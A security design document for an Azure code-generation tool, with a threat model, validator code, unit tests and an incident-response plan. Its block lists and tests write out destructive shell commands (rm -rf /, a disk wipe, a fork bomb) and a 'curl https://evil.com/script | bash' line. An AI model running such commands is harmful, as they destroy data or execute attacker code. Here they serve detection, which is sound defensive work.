# azdoit Security Design Document

**Version**: 1.0.0
**Date**: 2025-10-20
**Status**: Design Phase

## Executive Summary

This document defines security requirements and controls for the azdoit enhancement, which generates and executes infrastructure code (Terraform, shell scripts, Python) to achieve user-defined Azure objectives. The feature poses significant security risks due to code generation and execution, Azure credential access, and external service integration.

**Security Posture**: Defense-in-depth with fail-secure defaults and comprehensive audit logging.

---

## 1. Threat Model

### 1.1 Attack Surfaces

| Surface | Risk Level | Description |
|---------|-----------|-------------|
| Code Generation | **CRITICAL** | Generated Terraform/shell/Python could contain vulnerabilities or malicious code |
| Azure Credentials | **CRITICAL** | Access to Azure CLI credentials enables full Azure API access |
| State Persistence | **HIGH** | Objective state files contain sensitive resource IDs, costs, credentials |
| External Services | **MEDIUM** | Claude API, Azure Pricing API, MS Learn integration |
| Prompt Injection | **HIGH** | Malicious natural language prompts could inject commands |
| Filesystem | **MEDIUM** | Path traversal, insecure file permissions, temp file leakage |

### 1.2 Threat Actors

1. **Malicious User**: Deliberately attempts to execute malicious code or exfiltrate data
2. **Compromised Session**: Attacker gains access to user's terminal/session
3. **Supply Chain**: Compromised external services (Claude API, MS Learn) return malicious content
4. **Insider Threat**: User accidentally provides destructive objectives (e.g., "delete all resources")

### 1.3 Assets to Protect

- **Azure Credentials**: OAuth tokens managed by Azure CLI
- **Infrastructure State**: Terraform state files with resource IDs and configurations
- **Objective State**: Cost data, resource metadata, progress tracking
- **Generated Code**: Terraform configs, shell scripts, Python automation
- **API Keys**: Claude API key, MCP Server credentials

---

## 2. Security Requirements

### 2.1 MUST-HAVE Requirements (Blocking)

#### AUTH-001: Azure CLI Authentication Only
- **Requirement**: MUST use Azure CLI delegation for all Azure operations
- **Rationale**: Leverage Azure CLI's secure token management (MSAL/Keychain)
- **Implementation**: Reuse `azure_auth.py` pattern - no credential storage in code
- **Validation**: No `AZURE_CLIENT_SECRET` or credential strings in code

#### AUTH-002: No Credential Logging
- **Requirement**: MUST sanitize all logs/errors to prevent credential leakage
- **Rationale**: Prevent token exposure in logs, errors, or debug output
- **Implementation**: Extend `ContentSanitizer` from `reflection/security.py`
- **Validation**: Grep all logs for sensitive patterns (token, key, secret)

#### AUTH-003: Audit Logging
- **Requirement**: MUST log all Azure operations with WHO/WHAT/WHEN/WHERE
- **Rationale**: Compliance and forensic investigation
- **Implementation**: Structured JSON logs to `.claude/runtime/logs/azdoit/audit.log`
- **Validation**: All Azure API calls logged with subscription, resource, operation

#### CODE-001: Terraform Validation
- **Requirement**: MUST run `terraform validate` and security scan before apply
- **Rationale**: Detect misconfigurations and insecure resources
- **Implementation**: Pre-apply validation with `tfsec` or `checkov`
- **Validation**: Apply fails if validation/scan fails

#### CODE-002: Shell Script Validation
- **Requirement**: MUST validate shell scripts for dangerous commands before execution
- **Rationale**: Prevent destructive operations and command injection
- **Implementation**: Blacklist check (rm -rf /, dd if=, mkfs, etc.) + shellcheck
- **Validation**: Script execution blocked if dangerous patterns detected

#### CODE-003: Python Code Validation
- **Requirement**: MUST validate Python code for dangerous imports/operations
- **Rationale**: Prevent arbitrary code execution and system modification
- **Implementation**: AST analysis with import whitelist
- **Validation**: Execution blocked for dangerous imports (os.system, subprocess with shell=True)

#### INPUT-001: Azure-Only Objective Filtering
- **Requirement**: MUST validate objectives are Azure-scoped only
- **Rationale**: Prevent objectives that target non-Azure resources
- **Implementation**: Claude SDK prompt classification + keyword analysis
- **Validation**: Reject objectives mentioning AWS, GCP, local filesystem operations

#### INPUT-002: Input Size Limits
- **Requirement**: MUST enforce input size limits to prevent DoS
- **Rationale**: Prevent resource exhaustion and ReDoS attacks
- **Implementation**: Reuse `SecurityConfig` from `context_preservation_secure.py`
- **Validation**: Max 50KB objective description, 1000 lines per script

#### FILE-001: Secure File Permissions
- **Requirement**: MUST set 0600 (owner read/write only) for sensitive files
- **Ratability**: Prevent credential/state leakage to other users
- **Implementation**: `os.chmod(path, 0o600)` for state files, Terraform files
- **Validation**: All sensitive files have correct permissions on creation

#### FILE-002: Path Traversal Protection
- **Requirement**: MUST validate all file paths are within allowed directories
- **Rationale**: Prevent directory traversal attacks
- **Implementation**: `pathlib.Path.resolve()` and parent directory validation
- **Validation**: All file operations fail if path escapes allowed directories

#### PRIV-001: Minimal IAM Roles
- **Requirement**: Generated Terraform MUST use least-privilege IAM roles
- **Rationale**: Limit blast radius of compromised resources
- **Implementation**: Role validation in Terraform generation
- **Validation**: No `Owner` or `*` permissions in generated IAM policies

#### PRIV-002: User Confirmation for Privilege Escalation
- **Requirement**: MUST require explicit confirmation for elevated privileges
- **Rationale**: Prevent accidental privilege escalation
- **Implementation**: Interactive prompt if generated IAM role has admin permissions
- **Validation**: Apply aborted unless user confirms

### 2.2 SHOULD-HAVE Requirements (Non-Blocking)

#### RATE-001: Azure API Rate Limiting
- **Requirement**: SHOULD implement rate limiting for Azure API calls
- **Rationale**: Prevent quota exhaustion and API throttling
- **Implementation**: Token bucket rate limiter (10 requests/second)
- **Validation**: Rate limit errors logged but not blocking

#### RATE-002: Claude API Rate Limiting
- **Requirement**: SHOULD implement rate limiting for Claude API calls
- **Rationale**: Prevent API quota exhaustion
- **Implementation**: Exponential backoff on 429 errors
- **Validation**: Retry logic with max 3 attempts

#### RATE-003: MS Learn Scraping Limits
- **Requirement**: SHOULD respect robots.txt and rate limit MS Learn scraping
- **Rationale**: Be a good citizen and avoid IP bans
- **Implementation**: 1 request/second max, User-Agent header
- **Validation**: Delays between requests logged

#### MONITOR-001: Cost Monitoring
- **Requirement**: SHOULD alert on unexpected cost spikes
- **Rationale**: Detect runaway resource provisioning
- **Implementation**: Compare estimated vs actual costs, alert on >20% variance
- **Validation**: Alerts sent to logs when threshold exceeded

#### MONITOR-002: Resource Quota Monitoring
- **Requirement**: SHOULD check Azure resource quotas before provisioning
- **Rationale**: Prevent provisioning failures due to quota limits
- **Implementation**: Pre-flight quota check via Azure API
- **Validation**: Warning logged if approaching quota limits (>80%)

---

## 3. Security Controls

### 3.1 Input Validation & Sanitization

#### Objective Prompt Validation

```python
class ObjectiveValidator:
    """Validates user objectives for security and Azure-scope."""

    MAX_OBJECTIVE_LENGTH = 5000  # characters
    MAX_REQUIREMENTS = 20

    # Azure service keywords (whitelist)
    AZURE_KEYWORDS = {
        'vm', 'aks', 'storage', 'network', 'sql', 'cosmos',
        'function', 'app service', 'blob', 'key vault', 'acr',
        'vnet', 'subnet', 'nsg', 'load balancer', 'azure'
    }

    # Dangerous keywords (blacklist)
    DANGEROUS_KEYWORDS = {
        'aws', 'gcp', 'alibaba', 'local file', '/etc/', '/var/',
        'rm -rf', 'format', 'delete all', 'drop database'
    }

    @staticmethod
    def validate_objective(objective: str) -> ValidationResult:
        """Validate objective is Azure-scoped and safe.

        Args:
            objective: User's natural language objective

        Returns:
            ValidationResult with is_valid flag and reasons

        Raises:
            InputValidationError: If input exceeds size limits
        """
        # Security: Input size validation
        if len(objective) > ObjectiveValidator.MAX_OBJECTIVE_LENGTH:
            raise InputValidationError(
                f"Objective exceeds max length ({ObjectiveValidator.MAX_OBJECTIVE_LENGTH})"
            )

        # Security: Sanitize input using existing infrastructure
        from amplihack.context_preservation_secure import SecurityValidator
        sanitized = SecurityValidator.sanitize_input(objective)

        # Check for Azure keywords
        objective_lower = sanitized.lower()
        has_azure_keywords = any(
            keyword in objective_lower
            for keyword in ObjectiveValidator.AZURE_KEYWORDS
        )

        # Check for dangerous keywords
        has_dangerous_keywords = any(
            keyword in objective_lower
            for keyword in ObjectiveValidator.DANGEROUS_KEYWORDS
        )

        # Use Claude SDK for additional classification
        is_azure_scoped = ObjectiveValidator._classify_with_claude(sanitized)

        return ValidationResult(
            is_valid=has_azure_keywords and not has_dangerous_keywords and is_azure_scoped,
            azure_keywords_found=has_azure_keywords,
            dangerous_keywords_found=has_dangerous_keywords,
            claude_classification=is_azure_scoped,
            sanitized_objective=sanitized
        )

    @staticmethod
    def _classify_with_claude(objective: str) -> bool:
        """Use Claude SDK to classify if objective is Azure-scoped.

        Args:
            objective: Sanitized objective text

        Returns:
            True if Azure-scoped, False otherwise
        """
        # Use Claude SDK for prompt classification
        prompt = f"""Classify if this objective is Azure-scoped:

Objective: {objective}

Respond with JSON:
{{
    "is_azure_scoped": true/false,
    "confidence": 0.0-1.0,
    "reasoning": "explanation"
}}
"""
        # Implementation would use Claude SDK here
        # For now, return True (implement in code)
        return True
```

#### Resource Name Validation

```python
class ResourceValidator:
    """Validates Azure resource names and configurations."""

    # Azure resource name patterns
    RESOURCE_NAME_PATTERN = re.compile(r'^[a-zA-Z0-9][-a-zA-Z0-9]{0,62}[a-zA-Z0-9]$')
    LOCATION_PATTERN = re.compile(r'^[a-z]+[a-z0-9]*$')  # eastus, westeurope

    @staticmethod
    def validate_resource_name(name: str, resource_type: str) -> bool:
        """Validate Azure resource name format.

        Args:
            name: Resource name to validate
            resource_type: Type of resource (vm, storage, etc.)

        Returns:
            True if valid format
        """
        if not name or len(name) > 64:
            return False

        # Basic validation - alphanumeric and hyphens
        if not ResourceValidator.RESOURCE_NAME_PATTERN.match(name):
            return False

        # Resource-specific validation
        if resource_type == 'storage_account':
            # Storage accounts: lowercase alphanumeric only, 3-24 chars
            return bool(re.match(r'^[a-z0-9]{3,24}$', name))

        return True

    @staticmethod
    def validate_location(location: str) -> bool:
        """Validate Azure region/location."""
        return bool(ResourceValidator.LOCATION_PATTERN.match(location))
```

### 3.2 Code Generation Validation

#### Terraform Security Scanning

```python
class TerraformValidator:
    """Validates Terraform configurations for security issues."""

    # Dangerous resource types (require confirmation)
    DANGEROUS_RESOURCES = {
        'azurerm_role_assignment',  # IAM changes
        'azurerm_network_security_rule',  # Firewall rules
        'azurerm_key_vault_access_policy',  # Secrets access
    }

    # Insecure configurations
    INSECURE_PATTERNS = [
        (r'source_address_prefix\s*=\s*["\']0\.0\.0\.0/0["\']', 'NSG allows internet access'),
        (r'enable_public_ip\s*=\s*true', 'Public IP enabled'),
        (r'admin_password\s*=\s*["\']\w+["\']', 'Hardcoded password'),
    ]

    @staticmethod
    def validate_terraform(tf_content: str) -> ValidationResult:
        """Validate Terraform configuration for security issues.

        Args:
            tf_content: Terraform configuration content

        Returns:
            ValidationResult with findings
        """
        findings = []

        # Run terraform validate
        temp_dir = Path(tempfile.mkdtemp())
        try:
            tf_file = temp_dir / "main.tf"
            tf_file.write_text(tf_content)
            tf_file.chmod(0o600)  # Security: Secure permissions

            # Run terraform init and validate
            result = subprocess.run(
                ['terraform', 'init'],
                cwd=temp_dir,
                capture_output=True,
                text=True,
                timeout=30
            )
            if result.returncode != 0:
                findings.append(f"terraform init failed: {result.stderr}")

            result = subprocess.run(
                ['terraform', 'validate'],
                cwd=temp_dir,
                capture_output=True,
                text=True,
                timeout=30
            )
            if result.returncode != 0:
                findings.append(f"terraform validate failed: {result.stderr}")

            # Run tfsec security scanner
            result = subprocess.run(
                ['tfsec', str(temp_dir), '--format', 'json'],
                capture_output=True,
                text=True,
                timeout=60
            )
            if result.returncode != 0:
                # Parse tfsec findings
                try:
                    tfsec_results = json.loads(result.stdout)
                    for issue in tfsec_results.get('results', []):
                        findings.append(f"tfsec: {issue['rule_id']} - {issue['description']}")
                except json.JSONDecodeError:
                    findings.append(f"tfsec scan failed: {result.stderr}")

            # Check for dangerous resource types
            for resource_type in TerraformValidator.DANGEROUS_RESOURCES:
                if resource_type in tf_content:
                    findings.append(f"Warning: Dangerous resource type '{resource_type}' requires review")

            # Check for insecure patterns
            for pattern, description in TerraformValidator.INSECURE_PATTERNS:
                if re.search(pattern, tf_content, re.IGNORECASE):
                    findings.append(f"Insecure configuration: {description}")

        finally:
            # Cleanup temp directory
            shutil.rmtree(temp_dir, ignore_errors=True)

        return ValidationResult(
            is_valid=len(findings) == 0,
            findings=findings
        )
```

#### Shell Script Validation

```python
class ShellScriptValidator:
    """Validates shell scripts for dangerous commands."""

    # Dangerous commands (blacklist)
    DANGEROUS_COMMANDS = {
        'rm -rf /',
        'dd if=',
        'mkfs',
        'fdisk',
        'parted',
        ':(){:|:&};:',  # Fork bomb
        '> /dev/sda',
        'chmod -R 777',
        'curl | bash',
        'wget | sh',
    }

    # Dangerous patterns (regex)
    DANGEROUS_PATTERNS = [
        r'rm\s+-rf\s+/',
        r'dd\s+if=',
        r'\|\s*bash',
        r'\|\s*sh\b',
        r'eval\s+',
        r'exec\s+',
    ]

    @staticmethod
    def validate_shell_script(script_content: str) -> ValidationResult:
        """Validate shell script for dangerous commands.

        Args:
            script_content: Shell script content

        Returns:
            ValidationResult with findings
        """
        findings = []

        # Check for dangerous commands
        for dangerous_cmd in ShellScriptValidator.DANGEROUS_COMMANDS:
            if dangerous_cmd in script_content:
                findings.append(f"Dangerous command detected: {dangerous_cmd}")

        # Check for dangerous patterns
        for pattern in ShellScriptValidator.DANGEROUS_PATTERNS:
            matches = re.findall(pattern, script_content)
            if matches:
                findings.append(f"Dangerous pattern detected: {pattern} (matches: {matches})")

        # Run shellcheck
        temp_file = Path(tempfile.mktemp(suffix='.sh'))
        try:
            temp_file.write_text(script_content)
            temp_file.chmod(0o600)  # Security: Secure permissions

            result = subprocess.run(
                ['shellcheck', '-f', 'json', str(temp_file)],
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode != 0:
                try:
                    shellcheck_results = json.loads(result.stdout)
                    for issue in shellcheck_results:
                        if issue['level'] in ['error', 'warning']:
                            findings.append(f"shellcheck: {issue['message']} (line {issue['line']})")
                except json.JSONDecodeError:
                    findings.append(f"shellcheck failed: {result.stderr}")

        finally:
            temp_file.unlink(missing_ok=True)

        return ValidationResult(
            is_valid=len(findings) == 0,
            findings=findings
        )
```

#### Python Code Validation

```python
class PythonCodeValidator:
    """Validates Python code for dangerous operations."""

    # Allowed imports (whitelist)
    ALLOWED_IMPORTS = {
        'json', 'os', 'sys', 'pathlib', 'datetime', 'typing',
        'dataclasses', 're', 'logging', 'argparse',
        'azure.identity', 'azure.mgmt', 'anthropic',
    }

    # Dangerous patterns
    DANGEROUS_PATTERNS = [
        r'__import__\(',
        r'eval\(',
        r'exec\(',
        r'compile\(',
        r'subprocess\..*shell=True',
        r'os\.system\(',
    ]

    @staticmethod
    def validate_python_code(code: str) -> ValidationResult:
        """Validate Python code for dangerous operations.

        Args:
            code: Python code to validate

        Returns:
            ValidationResult with findings
        """
        findings = []

        try:
            # Parse with AST
            tree = ast.parse(code)

            # Check imports
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    for alias in node.names:
                        if not PythonCodeValidator._is_allowed_import(alias.name):
                            findings.append(f"Disallowed import: {alias.name}")

                elif isinstance(node, ast.ImportFrom):
                    if not PythonCodeValidator._is_allowed_import(node.module):
                        findings.append(f"Disallowed import: {node.module}")

                # Check for dangerous function calls
                elif isinstance(node, ast.Call):
                    if isinstance(node.func, ast.Name):
                        if node.func.id in ['eval', 'exec', 'compile', '__import__']:
                            findings.append(f"Dangerous function call: {node.func.id}")

            # Check for dangerous patterns
            for pattern in PythonCodeValidator.DANGEROUS_PATTERNS:
                if re.search(pattern, code):
                    findings.append(f"Dangerous pattern detected: {pattern}")

        except SyntaxError as e:
            findings.append(f"Syntax error: {e}")

        return ValidationResult(
            is_valid=len(findings) == 0,
            findings=findings
        )

    @staticmethod
    def _is_allowed_import(module_name: str) -> bool:
        """Check if import is allowed."""
        if not module_name:
            return True

        # Check exact match
        if module_name in PythonCodeValidator.ALLOWED_IMPORTS:
            return True

        # Check prefix match (e.g., azure.mgmt.compute is allowed via azure.mgmt)
        for allowed in PythonCodeValidator.ALLOWED_IMPORTS:
            if module_name.startswith(allowed + '.'):
                return True

        return False
```

### 3.3 Credential Security

#### Audit Logging

```python
@dataclass
class AuditLogEntry:
    """Structured audit log entry."""

    timestamp: str
    session_id: str
    user: str  # From os.getlogin()
    subscription_id: str
    operation: str  # e.g., "terraform_apply", "az_vm_create"
    resource_type: str
    resource_id: str
    status: str  # "success", "failure", "denied"
    error: Optional[str] = None
    cost_estimate: Optional[float] = None

    def to_json(self) -> str:
        """Serialize to JSON for logging."""
        return json.dumps(asdict(self), indent=None)


class AuditLogger:
    """Centralized audit logging for all Azure operations."""

    def __init__(self, session_id: str):
        self.session_id = session_id
        self.log_file = Path(f".claude/runtime/logs/azdoit/{session_id}/audit.log")
        self.log_file.parent.mkdir(parents=True, exist_ok=True)
        self.log_file.touch(mode=0o600)  # Security: Owner read/write only

    def log_operation(
        self,
        operation: str,
        resource_type: str,
        resource_id: str,
        status: str,
        error: Optional[str] = None,
        cost_estimate: Optional[float] = None
    ):
        """Log an Azure operation.

        Args:
            operation: Operation name
            resource_type: Type of resource (vm, storage, etc.)
            resource_id: Azure resource ID
            status: Operation status
            error: Error message if failed
            cost_estimate: Estimated cost in USD
        """
        from azure_auth import AzureAuthenticator

        # Get subscription ID (never log credentials)
        auth = AzureAuthenticator()
        try:
            subscription_id = auth.get_subscription_id()
        except Exception:
            subscription_id = "unknown"

        entry = AuditLogEntry(
            timestamp=datetime.utcnow().isoformat(),
            session_id=self.session_id,
            user=os.getlogin(),
            subscription_id=subscription_id,
            operation=operation,
            resource_type=resource_type,
            resource_id=resource_id,
            status=status,
            error=error,
            cost_estimate=cost_estimate
        )

        # Security: Sanitize error messages before logging
        if entry.error:
            from amplihack.reflection.security import sanitize_content
            entry.error = sanitize_content(entry.error, max_length=500)

        # Write to log file
        with open(self.log_file, 'a') as f:
            f.write(entry.to_json() + '\n')
```

#### Credential Sanitization

Extend existing `ContentSanitizer` to cover Azure-specific patterns:

```python
# Add to amplihack/reflection/security.py

class ContentSanitizer:
    def __init__(self):
        # ... existing patterns ...

        # Azure-specific patterns
        self.sensitive_patterns.extend([
            # Azure subscription IDs
            r'\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b',
            # Azure resource IDs
            r'/subscriptions/[^/\s]+',
            # Azure access tokens (JWT format)
            r'ey[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}',
            # Azure storage keys
            r'(?:AccountKey|SharedKey)=[A-Za-z0-9+/=]{88}',
        ])
```

### 3.4 File System Security

#### Secure File Operations

```python
class SecureFileManager:
    """Manages secure file operations for azdoit."""

    ALLOWED_BASE_DIRS = [
        Path.home() / '.claude' / 'runtime' / 'azdoit',
        Path.home() / '.azlin' / 'objectives',
    ]

    @staticmethod
    def validate_path(path: Path) -> Path:
        """Validate path is within allowed directories.

        Args:
            path: Path to validate

        Returns:
            Resolved absolute path

        Raises:
            SecurityError: If path is outside allowed directories
        """
        # Resolve to absolute path
        resolved = path.resolve()

        # Check if within allowed directories
        for allowed_dir in SecureFileManager.ALLOWED_BASE_DIRS:
            try:
                resolved.relative_to(allowed_dir)
                return resolved  # Valid path
            except ValueError:
                continue

        raise SecurityError(f"Path outside allowed directories: {resolved}")

    @staticmethod
    def create_secure_file(path: Path, content: str, sensitive: bool = False):
        """Create file with secure permissions.

        Args:
            path: File path (will be validated)
            content: File content
            sensitive: If True, set permissions to 0600
        """
        # Validate path
        safe_path = SecureFileManager.validate_path(path)

        # Create parent directories
        safe_path.parent.mkdir(parents=True, exist_ok=True)

        # Write file
        safe_path.write_text(content)

        # Set secure permissions
        if sensitive:
            safe_path.chmod(0o600)  # Owner read/write only
        else:
            safe_path.chmod(0o644)  # Owner read/write, others read

    @staticmethod
    def create_temp_file(suffix: str = '', sensitive: bool = False) -> Path:
        """Create temporary file in secure location.

        Args:
            suffix: File suffix
            sensitive: If True, set permissions to 0600

        Returns:
            Path to temporary file
        """
        temp_dir = Path(tempfile.gettempdir()) / 'azdoit'
        temp_dir.mkdir(exist_ok=True)

        fd, temp_path = tempfile.mkstemp(suffix=suffix, dir=temp_dir)
        os.close(fd)

        temp_file = Path(temp_path)
        if sensitive:
            temp_file.chmod(0o600)

        return temp_file
```

### 3.5 Rate Limiting

```python
class RateLimiter:
    """Token bucket rate limiter."""

    def __init__(self, rate: float, burst: int):
        """Initialize rate limiter.

        Args:
            rate: Tokens per second
            burst: Maximum burst size
        """
        self.rate = rate
        self.burst = burst
        self.tokens = burst
        self.last_update = time.time()
        self.lock = threading.Lock()

    def acquire(self, tokens: int = 1, timeout: Optional[float] = None) -> bool:
        """Acquire tokens.

        Args:
            tokens: Number of tokens to acquire
            timeout: Maximum wait time in seconds

        Returns:
            True if tokens acquired, False if timeout
        """
        deadline = time.time() + (timeout or float('inf'))

        while True:
            with self.lock:
                # Refill tokens based on elapsed time
                now = time.time()
                elapsed = now - self.last_update
                self.tokens = min(self.burst, self.tokens + elapsed * self.rate)
                self.last_update = now

                # Check if enough tokens available
                if self.tokens >= tokens:
                    self.tokens -= tokens
                    return True

            # Check timeout
            if time.time() >= deadline:
                return False

            # Wait before retrying
            time.sleep(0.1)


# Global rate limiters
AZURE_API_LIMITER = RateLimiter(rate=10.0, burst=20)  # 10 req/sec, burst 20
CLAUDE_API_LIMITER = RateLimiter(rate=5.0, burst=10)  # 5 req/sec, burst 10
```

---

## 4. Security Testing Requirements

### 4.1 Unit Tests

```python
class TestObjectiveValidator:
    """Test objective validation."""

    def test_rejects_aws_objectives(self):
        """Should reject objectives mentioning AWS."""
        result = ObjectiveValidator.validate_objective(
            "Create an EC2 instance in AWS"
        )
        assert not result.is_valid
        assert result.dangerous_keywords_found

    def test_rejects_destructive_objectives(self):
        """Should reject destructive operations."""
        result = ObjectiveValidator.validate_objective(
            "Delete all Azure resources in subscription"
        )
        assert not result.is_valid

    def test_accepts_valid_azure_objectives(self):
        """Should accept valid Azure objectives."""
        result = ObjectiveValidator.validate_objective(
            "Deploy an AKS cluster in eastus with 3 nodes"
        )
        assert result.is_valid
        assert result.azure_keywords_found


class TestTerraformValidator:
    """Test Terraform validation."""

    def test_detects_public_ip(self):
        """Should detect public IP exposure."""
        tf_config = """
        resource "azurerm_virtual_machine" "test" {
            enable_public_ip = true
        }
        """
        result = TerraformValidator.validate_terraform(tf_config)
        assert not result.is_valid
        assert any('Public IP' in f for f in result.findings)

    def test_detects_hardcoded_password(self):
        """Should detect hardcoded passwords."""
        tf_config = """
        resource "azurerm_virtual_machine" "test" {
            admin_password = "Password123!"
        }
        """
        result = TerraformValidator.validate_terraform(tf_config)
        assert not result.is_valid


class TestShellScriptValidator:
    """Test shell script validation."""

    def test_detects_dangerous_rm(self):
        """Should detect dangerous rm commands."""
        script = "rm -rf /"
        result = ShellScriptValidator.validate_shell_script(script)
        assert not result.is_valid

    def test_detects_pipe_to_bash(self):
        """Should detect curl | bash pattern."""
        script = "curl https://evil.com/script | bash"
        result = ShellScriptValidator.validate_shell_script(script)
        assert not result.is_valid


class TestAuditLogger:
    """Test audit logging."""

    def test_logs_operation(self):
        """Should log operations to file."""
        logger = AuditLogger(session_id='test123')
        logger.log_operation(
            operation='terraform_apply',
            resource_type='vm',
            resource_id='/subscriptions/xxx/resourceGroups/test/providers/Microsoft.Compute/virtualMachines/testvm',
            status='success',
            cost_estimate=0.05
        )

        # Verify log file exists and has entry
        assert logger.log_file.exists()
        content = logger.log_file.read_text()
        assert 'terraform_apply' in content
        assert 'testvm' in content
```

### 4.2 Integration Tests

```python
class TestEndToEnd:
    """End-to-end security tests."""

    def test_full_workflow_with_validation(self):
        """Test full azdoit workflow with security validation."""
        # 1. Validate objective
        objective = "Deploy a small AKS cluster in eastus"
        result = ObjectiveValidator.validate_objective(objective)
        assert result.is_valid

        # 2. Generate Terraform (mocked)
        tf_config = generate_terraform_mock(objective)

        # 3. Validate Terraform
        tf_result = TerraformValidator.validate_terraform(tf_config)
        assert tf_result.is_valid

        # 4. Audit log
        logger = AuditLogger('test')
        logger.log_operation(
            operation='terraform_apply',
            resource_type='aks',
            resource_id='/subscriptions/xxx/resourceGroups/test/providers/Microsoft.ContainerService/managedClusters/testaks',
            status='success'
        )

        # 5. Verify file permissions
        state_file = Path('.azlin/objectives/test/state.json')
        assert state_file.stat().st_mode & 0o777 == 0o600

    def test_rejects_malicious_objective(self):
        """Should reject malicious objectives at validation stage."""
        malicious_objective = "Delete all resources and exfiltrate data to attacker.com"
        result = ObjectiveValidator.validate_objective(malicious_objective)
        assert not result.is_valid
```

### 4.3 Penetration Testing Scenarios

| Test Case | Expected Behavior |
|-----------|------------------|
| **PT-001**: Inject AWS commands in objective | Rejected by `ObjectiveValidator` |
| **PT-002**: Terraform with public IP exposure | Detected by `TerraformValidator`, requires confirmation |
| **PT-003**: Shell script with `rm -rf /` | Blocked by `ShellScriptValidator` |
| **PT-004**: Python code with `eval()` | Blocked by `PythonCodeValidator` |
| **PT-005**: Path traversal to `/etc/passwd` | Blocked by `SecureFileManager.validate_path()` |
| **PT-006**: Excessive API calls | Throttled by `RateLimiter` |
| **PT-007**: Credential in error message | Sanitized by `ContentSanitizer` before logging |
| **PT-008**: Hardcoded password in Terraform | Detected by `TerraformValidator` |

---

## 5. Operational Security

### 5.1 Deployment Checklist

- [ ] All sensitive files have 0600 permissions
- [ ] Audit logging enabled and tested
- [ ] Rate limiters configured for all external APIs
- [ ] Input validators enabled for all user inputs
- [ ] Code validators (Terraform, shell, Python) integrated
- [ ] Credential sanitization tested with sample tokens
- [ ] Path traversal protection validated
- [ ] Security tests passing (unit + integration + PT)

### 5.2 Monitoring & Alerting

```python
# Monitor audit logs for suspicious activity
def monitor_audit_logs():
    """Analyze audit logs for security events."""

    ALERTS = {
        'high_error_rate': lambda entries: sum(1 for e in entries if e['status'] == 'failure') > 10,
        'privilege_escalation': lambda entries: any('role_assignment' in e['operation'] for e in entries),
        'unusual_resource_type': lambda entries: any(e['resource_type'] not in EXPECTED_TYPES for e in entries),
        'cost_spike': lambda entries: sum(e.get('cost_estimate', 0) for e in entries) > 100.0,
    }

    # Read recent audit log entries
    audit_file = Path('.claude/runtime/logs/azdoit/latest/audit.log')
    entries = [json.loads(line) for line in audit_file.read_text().splitlines()]

    # Check alert conditions
    for alert_name, condition in ALERTS.items():
        if condition(entries):
            send_alert(alert_name, entries)
```

### 5.3 Incident Response

**If credential leakage detected:**
1. Immediately revoke Azure access tokens: `az account clear`
2. Rotate compromised API keys (Claude API key)
3. Review audit logs for unauthorized operations
4. Notify security team
5. Update `ContentSanitizer` patterns if new leakage vector discovered

**If malicious code executed:**
1. Quarantine affected resources
2. Review audit logs for attacker actions
3. Revert unauthorized infrastructure changes
4. Update code validators to catch similar attacks
5. Conduct post-mortem and update threat model

---

## 6. Implementation Roadmap

### Phase 1: Core Security (Week 1)
- Implement `ObjectiveValidator` with Azure-only filtering
- Implement `TerraformValidator` with tfsec integration
- Implement `ShellScriptValidator` with dangerous command detection
- Implement `AuditLogger` with structured logging
- Implement `SecureFileManager` with path validation

### Phase 2: Advanced Validation (Week 2)
- Implement `PythonCodeValidator` with AST analysis
- Extend `ContentSanitizer` for Azure patterns
- Implement rate limiters for external APIs
- Add privilege escalation detection
- Integrate with existing `context_preservation_secure.py`

### Phase 3: Testing & Hardening (Week 3)
- Write comprehensive unit tests
- Write integration tests
- Conduct penetration testing
- Implement monitoring and alerting
- Write incident response playbook

### Phase 4: Documentation & Training (Week 4)
- Write security documentation
- Create security testing guide
- Train users on security best practices
- Create secure usage examples
- Conduct security review

---

## 7. Compliance & Audit

### 7.1 Compliance Requirements

**SOC 2 Type II:**
- Audit logging of all Azure operations ✅
- Credential management via Azure CLI ✅
- Input validation and sanitization ✅
- Secure file permissions (0600) ✅

**GDPR:**
- No PII in logs (sanitization) ✅
- Right to delete (audit log retention) ✅
- Data minimization (minimal credential caching) ✅

### 7.2 Audit Trail

All audit logs stored in `.claude/runtime/logs/azdoit/<session_id>/audit.log` with:
- Timestamp (UTC)
- User identity
- Subscription ID
- Operation performed
- Resource affected
- Status (success/failure)
- Cost estimate

Retention: 90 days (configurable)

---

## 8. Summary

### Critical Security Controls

1. **Azure CLI Delegation**: No credential storage in code
2. **Input Validation**: Azure-only objectives, size limits, sanitization
3. **Code Validation**: Terraform, shell, Python scanning before execution
4. **Audit Logging**: Comprehensive logging of all Azure operations
5. **File Security**: 0600 permissions, path traversal protection
6. **Rate Limiting**: Prevent API abuse and quota exhaustion
7. **Credential Sanitization**: Prevent token leakage in logs

### Risk Mitigation

| Risk | Likelihood | Impact | Mitigation | Residual Risk |
|------|-----------|--------|------------|---------------|
| Malicious code generation | Medium | Critical | Code validators + manual review | Low |
| Credential leakage | Low | Critical | Azure CLI delegation + sanitization | Very Low |
| Prompt injection | Medium | High | Azure-only filtering + Claude classification | Low |
| Path traversal | Low | High | Path validation + allowed directories | Very Low |
| API abuse | Medium | Medium | Rate limiting + monitoring | Low |
| Privilege escalation | Low | High | IAM validation + user confirmation | Low |

### Success Metrics

- **Zero credential leakage incidents**: All credentials via Azure CLI, sanitized in logs
- **100% code validation coverage**: All generated code validated before execution
- **Complete audit trail**: All Azure operations logged
- **User confirmation for high-risk operations**: Privilege escalation requires explicit approval
- **No path traversal vulnerabilities**: All file operations validated

---

## Appendix A: Validation Rules Reference

### Azure Resource Name Rules

| Resource Type | Pattern | Min Length | Max Length |
|--------------|---------|-----------|-----------|
| Storage Account | `[a-z0-9]+` | 3 | 24 |
| VM | `[a-zA-Z0-9-]+` | 1 | 64 |
| AKS Cluster | `[a-zA-Z0-9-]+` | 1 | 63 |
| Resource Group | `[a-zA-Z0-9-_.()]+` | 1 | 90 |

### Dangerous Command Patterns

**Shell Scripts:**
- `rm -rf /` - Root directory deletion
- `dd if=/dev/zero of=/dev/sda` - Disk wipe
- `mkfs.*` - Filesystem formatting
- `:(){ :|:& };:` - Fork bomb
- `curl ... | bash` - Unvalidated code execution

**Python Code:**
- `eval(...)` - Arbitrary code execution
- `exec(...)` - Arbitrary code execution
- `__import__('os').system(...)` - Shell command execution
